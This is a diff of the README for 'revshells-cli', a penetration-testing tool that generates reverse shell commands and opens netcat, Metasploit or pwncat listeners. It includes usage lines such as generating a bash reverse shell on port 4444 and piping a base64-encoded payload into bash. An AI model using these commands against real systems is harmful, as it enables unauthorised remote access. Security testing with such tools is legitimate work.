@@ -6,7 +6,7 @@ NOTE: I have not done any other testing besides on Kali with Xfce for now and yo
 
 ## Usage
 ```
-Usage of revshells-cli:
+Usage of ./revshells-cli_linux_amd64:
   -L    List all available shells
   -e string
         Encoding method: base64, 2xbase64, or urlenc (default "none")
@@ -24,6 +24,7 @@ Usage of revshells-cli:
         Choose the reverse shell format (default "bash")
   -s string
         the shell to use (default "bash")
+  -v    Show version and exit
 ```
 
 ## Installation and Setup
@@ -33,34 +34,48 @@ Usage of revshells-cli:
    ```
 
 2. Compile the program:
-   ```
-   go build -o revshell-cli
-   ```
+  - You will need `github.com/atotto/clipboard` 
+    ```
+    go init revshells-cli  
+    ```
+    ```
+    go get github.com/atotto/clipboard
+    ```
+  - Then you can build
+    ```
+    go build -o revshell-cli
+    ```
 3. Or download the latest release and run it
+  - https://github.com/shadowraven65/revshells-cli/releases/latest/
+
+  - Kali and Parrot users can use this as an install option.
+  ```
+  sudo curl -L https://github.com/shadowraven65/revshells-cli/releases/latest/download/revshells-cli_linux_amd64 -o /usr/local/bin/revshells-cli
+  ```
 
 ## Usage
 - **Generate Reverse Shell Commands:**
   ```
-  ./revshells-cli -s bash -i tun0 -p 4444 -r bash
+  revshells-cli -s bash -i tun0 -p 4444 -r bash
   ```
 - **Use with Quiet Mode**
   ```
-  echo "echo '$(./revshells-cli -e base64 -q)' | base64 -d | bash" 
+  echo "echo '$(revshells-cli -e base64 -q)' | base64 -d | bash" 
   ```
 
 - **Set Up Listeners (examples):**
   - **CLI will open in multiplexer where GUI will open in new terminal emulator**
   - Netcat:
     ```
-    ./revshells-cli -l nc -mode cli
+    revshells-cli -l nc -mode cli
     ```
   - Metasploit:
     ```
-    ./revshells-cli -l msf -mode gui
+    revshells-cli -l msf -mode gui
     ```
   - pwncat:
     ```
-    ./revshells-cli -l pwncat -mode cli
+    revshells-cli -l pwncat -mode cli
     ```
 
 ## Features
